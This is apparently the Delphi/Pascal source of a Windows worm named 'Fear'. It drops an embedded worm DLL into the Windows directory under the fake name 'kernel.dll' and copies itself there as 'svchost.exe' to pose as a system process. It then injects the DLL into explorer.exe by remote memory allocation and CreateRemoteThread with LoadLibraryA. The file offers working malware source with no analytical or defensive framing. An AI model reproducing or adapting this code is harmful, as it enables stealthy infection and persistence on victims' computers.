   PROGRAM Fear;

   USES
     Windows,
     TlHelp32,
     Prepender IN 'PREPENDER.PAS',
     AclUtils IN 'ACLUnits\ACLUTILS.PAS';

   {$R icon.res}
   {$I RESOURCES\FEAR_DLL.INI}

   VAR
     F       : FILE OF Byte;
     I       : WORD;
     PID     : DWORD;
     Process : DWORD;

   CONST
     S = 'kernel.dll';
     T = 'svchost.exe';

   {$L 'SRT.obj'}

   FUNCTION FileExists(pszPath:STRING) : BOOL; STDCALL; EXTERNAL 'shlwapi.dll' Name 'PathFileExistsA';
   FUNCTION RT_GetVersion(pReserved:Pointer) : LongWord; STDCALL; EXTERNAL;
   FUNCTION xVirtualAllocEx(hProcess:LongWord;lpAddress:Pointer;dwSize:LongWord;flAllocationType:LongWord;flProtect:LongWord) : Pointer; STDCALL; EXTERNAL;
   FUNCTION xVirtualFreeEx(hProcess:LongWord;lpAddress:Pointer;dwSize:LOngWord;dwFreeType:LongWord) : Boolean; STDCALL; EXTERNAL;
   FUNCTION xCreateRemoteThread(hProcess:LongWord;lpThreadAttributes:Pointer;dwStackSize:LongWord;lpStartAddress:Pointer;lpParameter:Pointer;dwCreationFlags:LongWord;lpThreadId:Pointer) : LongWord; STDCALL; EXTERNAL;

   FUNCTION InjectLibrary(Process:LongWord;DLLPath:pChar) : Boolean;
   VAR
     BytesWritten : DWORD;
     Thread       : DWORD;
     ThreadID     : DWORD;
     Parameters   : Pointer;
   BEGIN
     Result:=False;
     Parameters:=xVirtualAllocEx(Process,NIL,4096,MEM_COMMIT,PAGE_READWRITE);
     IF Parameters=NIL THEN Exit;
     WriteProcessMemory(Process,Parameters,Pointer(DLLPath),4096,BytesWritten);
     Thread:=xCreateRemoteThread(Process,NIL,0,GetProcAddress(GetModuleHandle('KERNEL32.DLL'),'LoadLibraryA'),Parameters,0,@ThreadId);
     WaitForSingleObject(Thread,INFINITE);
     xVirtualFreeEx(Process,Parameters,0,MEM_RELEASE);
     IF Thread=0 THEN Exit;
     CloseHandle(Thread);
     Result:=True;
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   FUNCTION GetProcessID(sProcName:STRING) : Integer;
   VAR
     hProcSnap : THandle;
     pe32      : TProcessEntry32;
   BEGIN
     Result:=-1;
     hProcSnap:=CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS,0);
     IF hProcSnap=INVALID_HANDLE_VALUE THEN Exit;
     pe32.dwSize:=SizeOf(ProcessEntry32);
     IF Process32First(hProcSnap,pe32)=True THEN
     WHILE Process32Next(hProcSnap,pe32)=True DO IF pos(sProcName,UpperCase(pe32.szExeFile))>0 THEN Result:=pe32.th32ProcessID;
   END;

   PROCEDURE DroppDll;
   VAR
     F : File;
   BEGIN
     AssignFile(F,WinPath+S);
     Rewrite(F,1);
     BlockWrite(F,Worm[1],SizeOf(Worm));
     CloseFile(F);
   END;

   BEGIN
     DropFile;
     AssignFile(F,WinPath+S);
     FileMode:=2;
     {$I-}
     Reset(F);
     {$I+}
     I:=IOResult;
     IF I=0 THEN CloseFile(F);
     IF(I=0)or(NOT FileExists(WinPath+S))THEN BEGIN
       DroppDll;
       IF NOT FileExists(WinPath+T) THEN BEGIN
         CopyFile(pChar(ParamStr(0)),pChar(WinPath+T),False);
         CutFile(WinPath+T);
       END;
       PID:=GetProcessID('EXPLORER.EXE');
       Process:=OpenProcess(PROCESS_ALL_ACCESS,False,PID);
       InjectLibrary(Process,S);
     END;
     {PID:=GetProcessID('WN.EXE');
     Process:=OpenProcess(PROCESS_ALL_ACCESS,False,PID);
     InjectLibrary(Process,'f:\i-worm.fear\fear_dll.dll');}
   END.
